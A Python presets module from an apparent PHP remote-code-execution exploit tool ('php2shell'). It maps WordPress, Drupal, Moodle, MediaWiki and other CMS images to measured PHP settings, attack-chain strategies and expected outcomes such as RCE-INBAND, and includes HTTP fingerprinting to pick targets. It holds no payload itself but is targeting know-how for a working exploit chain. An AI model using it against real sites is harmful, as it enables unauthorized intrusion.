#!/usr/bin/env python3
"""Per-CMS chain presets for php2shell.

A CMS preset bundles the *observed default configuration* of one application
image with the chain arguments that configuration requires.  It is a
convenience layer, not a new exploit: every value here was measured on the
image named in ``images`` (see docs/research/cms.md §3 and docs/research/cms.md §6).

Why presets are needed: the same PHP version ships in many builds, and each
application pins different ini defaults.  Our chains care about four things
(``docs/research/cms.md`` §4):

    display_errors=On          warning chain
    post_max_size > memory_limit   warning chain reachability
    session.upload_progress=On     session consumer
    A1 shape matches the build   pure128 OOM site (docs/research/claims.md §4)

Selecting the wrong combination wastes minutes per target, and a wrong
`--pure128` on a display_errors=On target silently takes the slow path.

Resolution order (see exploit.resolve_cms):

  1. ``--cms NAME``                     explicit, no detection
  2. container image name               most reliable (image tag names the app)
  3. HTTP fingerprint (headers/body)    works for remote targets
  4. nothing matched                    normal flow, unchanged

The preset only *pre-fills* arguments; anything the user set explicitly on the
command line wins.
"""
from __future__ import annotations

from dataclasses import dataclass, field


@dataclass(frozen=True)
class CmsPreset:
    name: str
    title: str
    # image name substrings, lowercase (matched against `docker image` refs)
    images: tuple[str, ...] = ()
    # body/header markers, lowercase; any hit counts
    http_markers: tuple[str, ...] = ()
    php: str = ""
    display_errors: str = ""
    memory_limit_mb: int | None = None
    post_max_size_mb: int | None = None
    save_path: str = ""
    # "warning" | "pure128"
    strategy: str = "warning"
    chunked: bool = False
    limits: tuple[int, ...] = ()
    # short human label for the expected outcome
    expected: str = ""
    notes: str = ""


# Every value below was measured with tools/cms_fingerprint.py on the image in
# `images`; see docs/research/cms.md §3.1.
PRESETS: dict[str, CmsPreset] = {
    "moodle": CmsPreset(
        name="moodle",
        title="Moodle 8.4 (PHP 8.4.26, de=On, 128M/206M)",
        images=("moodle",),
        http_markers=('name="sesskey"', "m.cfg", "moodle"),
        php="8.4.26", display_errors="On",
        memory_limit_mb=128, post_max_size_mb=206,
        strategy="warning", limits=(128,),
        expected="NOT TESTABLE on this image: the moodlehq image ships an empty "
                 "docroot (GET / -> 403) and needs an install run first.  The "
                 "equivalent Moodle 8.4 / PHP 8.4.26 lab (moodle-lab, docs/research/cms.md) "
                 "already reaches RCE-INBAND at 8M.",
        notes="The only CMS image whose defaults satisfy post_max_size > "
              "memory_limit; huge=132 fits under 206M.",
    ),
    "wordpress": CmsPreset(
        name="wordpress",
        title="WordPress 6.8 / 6.8.3 (PHP 8.4.15, de=Off, 128M/8M)",
        images=("wordpress", "wpvuln"),
        http_markers=("wp-content", "wp-includes", "wp-json",
                      'name="generator" content="wordpress'),
        php="8.4.15", display_errors="Off",
        memory_limit_mb=128, post_max_size_mb=8,
        save_path="",
        strategy="pure128", chunked=True, limits=(128,),
        expected="UNREACHABLE-CONFIG (A1 OOM lands in php_var_unserialize_init "
                 "during session decode, 8.2KB -> 12288B, i.e. AFTER "
                 "php_session_reset_id; no stale send_cookie/id pair.  "
                 "save_path is not the blocker — see docs/research/claims.md §3/§4)",
        notes="6.8 and 6.8.3 share the same libphp (e308d2ee…), so the "
              "8.4.15 offsets from docs/research/cms.md apply to both.  docs/research/claims.md §4: the "
              "empty session.save_path is NOT a blocker — pure128 proves with "
              "an empty path on 1/2/5-worker labs (the old 0/3 was a "
              "retry-budget artifact).  The measured blocker is the A1 OOM "
              "site: gdb shows it in php_var_unserialize_init's "
              "php_unserialize_data allocation (12288B) during session decode, "
              "i.e. AFTER php_session_reset_id, so no stale send_cookie/id pair "
              "is left.  The A1 shape must be re-derived for this build "
              "(docs/research/claims.md §4.3: the sweep needs a 4KB-window hit that the "
              "bin-page allocator did not provide in 2026-10-25 tests).",
    ),
    "drupal": CmsPreset(
        name="drupal",
        title="Drupal 11.2 (PHP 8.4.23, de=On, 128M/8M)",
        images=("drupal",),
        http_markers=("drupal.settings", "x-generator: drupal",
                      "/sites/default/files", "drupal"),
        php="8.4.23", display_errors="On",
        memory_limit_mb=128, post_max_size_mb=8,
        strategy="warning", chunked=True, limits=(128,),
        expected="UNREACHABLE-CONFIG (measured 2026-10-23: no OOM at a 132MB "
                 "chunked field; OOM only at 64MB, so the A shape mismatches)",
        notes="docs/research/cms.md §3.2: with 1 worker and --chunked the 132MB field still "
              "returns 200 (fresh Set-Cookie); a 64MB field is what OOMs.  The "
              "application's resident allocation shrinks the parse-phase "
              "headroom, so the A shape needs Drupal-specific calibration.",
    ),
    "joomla": CmsPreset(
        name="joomla",
        title="Joomla 5.1 (PHP 8.2.21, de=Off, 128M/8M)",
        images=("joomla",),
        http_markers=("/media/system/js/", 'content="joomla', "joomla"),
        php="8.2.21", display_errors="Off",
        memory_limit_mb=128, post_max_size_mb=8,
        strategy="pure128", chunked=True, limits=(128,),
        expected="RCE-LOCAL-BASE (8.2 has no in-band cookie leak)",
        notes="8.2 clears send_cookie, so only /proc/1/maps works.  pure128 "
              "on 8.2 is unverified — the 0xF8398 offset is 8.4.26-specific.",
    ),
    "phpmyadmin": CmsPreset(
        name="phpmyadmin",
        title="phpMyAdmin 5.2 / 5.2.2 (PHP 8.3.35 / 8.2.29, 512M/2M)",
        images=("phpmyadmin", "pma-lab"),
        http_markers=("phpmyadmin", "pma_", "/themes/pmahomme"),
        php="8.3.35", display_errors="On",
        memory_limit_mb=512, post_max_size_mb=2,
        save_path="/sessions",
        strategy="warning", chunked=True, limits=(512,),
        expected="UNREACHABLE-CONFIG (measured 2026-10-23: the app entry page "
                 "overrides display_errors, so preflight picks pure128; 8.3 has "
                 "no verified pure128 geometry, and 512M/2M is uncalibrated)",
        notes="Non-empty session.save_path helps pure128, but PHP 8.3 uses "
              "the same 0xF8398 constant which was measured on 8.4.26.  "
              "show_config_errors.php calls error_reporting(E_ALL), so probing "
              "the app entry reports de=Off even when php.ini says On — probe a "
              "neutral PHP page instead (docs/research/cms.md §3.5).",
    ),
    "nextcloud": CmsPreset(
        name="nextcloud",
        title="Nextcloud 32 (PHP 8.3.35, de=On, 512M/512M)",
        images=("nextcloud",),
        http_markers=("oc_sessionpassphrase", "__host-nc_samesitecookie",
                      "nextcloud"),
        php="8.3.35", display_errors="On",
        memory_limit_mb=512, post_max_size_mb=512,
        strategy="warning", chunked=True, limits=(512,),
        expected="UNREACHABLE-CONFIG (measured 2026-10-23: warning-chain "
                 "stage1 HEAP_LEAK_FAILED even at 1 worker; 512M/512M "
                 "uncalibrated)",
        notes="post_max_size == memory_limit means the huge field cannot both "
              "fit and OOM; --chunked skips the post check, then the 512M "
              "stage3 geometry is still uncalibrated (docs/research/cms.md §3.5).",
    ),
    "matomo": CmsPreset(
        name="matomo",
        title="Matomo (PHP 8.4.26, de=Off, 256M/8M)",
        images=("matomo",),
        http_markers=("matomo", "_pk_id", "piwik"),
        php="8.4.26", display_errors="Off",
        memory_limit_mb=256, post_max_size_mb=8,
        strategy="pure128", chunked=True, limits=(256,),
        expected="UNREACHABLE-CONFIG (measured 2026-10-23: 256M has no verified "
                 "pure128 geometry; warning chain blocked by de=Off)",
        notes="libphp sha256 94b873f5… is shared with Roundcube 1.6.19.  "
              "pure128 only has a calibrated 128M geometry, so 256M cannot run "
              "it (docs/research/cms.md §3.5).",
    ),
    "mediawiki": CmsPreset(
        name="mediawiki",
        title="MediaWiki 1.43.9 (PHP 8.3.35, de=On, 128M/8M)",
        images=("mediawiki",),
        http_markers=("mediawiki", "wgscriptpath", "mw-"),
        php="8.3.35", display_errors="On",
        memory_limit_mb=128, post_max_size_mb=8,
        strategy="warning", chunked=True, limits=(128,),
        expected="RCE-INBAND (measured 2026-10-24: --workers auto pins 149/150 "
                 "and stage1/2/3 all pass; earlier LEAK-ONLY came from forcing "
                 "1 worker, which left stage 3 on an uncalibrated shape. "
                 "docs/research/t2-t3.md N1)",
        notes="Newly covered by the CNVD advisory (docs/research/cms.md).  The image default "
              "is StartServers 5 / MaxRequestWorkers 150; do NOT force it to 1 "
              "worker — pass --workers auto so the pinner holds 149 and leaves "
              "exactly one child, which is what made stage 3 work (docs/research/t2-t3.md N1).",
    ),
    "roundcube": CmsPreset(
        name="roundcube",
        title="Roundcube 1.6.19 (PHP 8.4.26, de=Off, 64M/6M)",
        images=("roundcube", "roundcubemail"),
        http_markers=("roundcube", "rcmail"),
        php="8.4.26", display_errors="Off",
        memory_limit_mb=64, post_max_size_mb=6,
        strategy="pure128", chunked=True, limits=(64,),
        expected="UNREACHABLE-CONFIG (measured 2026-10-23: A1 OOM alloc is 20480B, "
                 "not 4096B; 64M geometry also uncalibrated)",
        notes="libphp sha256 94b873f5… is shared with Matomo; the 8.4.26 "
              "offsets apply, but the 64M heap geometry does not, and the A1 "
              "OOM lands on a 20480B allocation (docs/research/cms.md §3.4).",
    ),
    "prestashop": CmsPreset(
        name="prestashop",
        title="PrestaShop (PHP 8.x)",
        images=("prestashop",),
        http_markers=("prestashop", "var prestashop"),
        expected="UNVERIFIED (image present, no fingerprint yet)",
        notes="Fingerprint first with tools/cms_fingerprint.py.",
    ),
    "kanboard": CmsPreset(
        name="kanboard",
        title="Kanboard (PHP 8.5.x)",
        images=("kanboard",),
        http_markers=("kanboard",),
        expected="UNVERIFIED (latest tag is rebuilt to 8.5.12)",
        notes="The latest tag is patched; only pre-2026-10-21 tags qualify.",
    ),
    "laravel": CmsPreset(
        name="laravel",
        title="Laravel (self-built)",
        images=("laravel",),
        http_markers=("laravel_session", "xsrf-token"),
        expected="UNVERIFIED (no reliable public image; build on php:8.4.26-apache)",
        notes="Use php:8.4.26-apache as the base so the existing profile applies.",
    ),
    "symfony": CmsPreset(
        name="symfony",
        title="Symfony (self-built)",
        images=("symfony",),
        http_markers=("sf_redirect", "_sf2_attributes"),
        expected="UNVERIFIED (no reliable public image; build on php:8.4.26-apache)",
    ),
    "magento": CmsPreset(
        name="magento",
        title="Magento (self-built)",
        images=("magento",),
        http_markers=("mage/cookies", "x-magento"),
        expected="UNVERIFIED (bitnami image unavailable; build on php:8.4.26-apache)",
    ),
    "opencart": CmsPreset(
        name="opencart",
        title="OpenCart (self-built)",
        images=("opencart",),
        http_markers=("route=common/home", "opencart"),
        expected="UNVERIFIED (no official apache image; build on php:8.4.26-apache)",
    ),
    "whmcs": CmsPreset(
        name="whmcs",
        title="WHMCS (commercial, no image)",
        images=(),
        http_markers=("whmcs",),
        expected="NOT TESTABLE (commercial software, no image)",
    ),
}


def resolve_name(text: str) -> str | None:
    """Fuzzy-match a free-form string (image ref or marker) to a preset name."""
    low = text.lower()
    # longest alias first so "roundcubemail" wins over "roundcube"
    hits = []
    for name, p in PRESETS.items():
        for alias in (name, *p.images):
            if alias and alias in low:
                hits.append((len(alias), name))
    if not hits:
        return None
    hits.sort(reverse=True)
    return hits[0][1]


def detect_from_container(container: str, image_ref: str = "") -> str | None:
    """Match a container's image reference against the preset table."""
    for candidate in (image_ref, container):
        if not candidate:
            continue
        name = resolve_name(candidate)
        if name:
            return name
    return None


def detect_from_http(head: bytes, body: bytes) -> str | None:
    """Match response headers+body markers.  `head` is raw headers (bytes)."""
    blob = (head + b"\n" + body[:200000]).lower()
    best: tuple[int, str] | None = None
    for name, p in PRESETS.items():
        score = 0
        for marker in p.http_markers:
            if marker.encode() in blob:
                score += 1
        if score and (best is None or score > best[0]):
            best = (score, name)
    return best[1] if best else None


def preset_table_rows() -> list[dict]:
    """Rows for `--cms list` and docs."""
    rows = []
    for p in PRESETS.values():
        rows.append({
            "cms": p.name,
            "php": p.php or "?",
            "display_errors": p.display_errors or "?",
            "memory_limit": f"{p.memory_limit_mb}M" if p.memory_limit_mb else "?",
            "post_max_size": f"{p.post_max_size_mb}M" if p.post_max_size_mb else "?",
            "save_path": p.save_path or "(empty)",
            "strategy": p.strategy,
            "chunked": p.chunked,
            "limits": ",".join(str(x) for x in p.limits),
            "expected": p.expected,
        })
    return rows
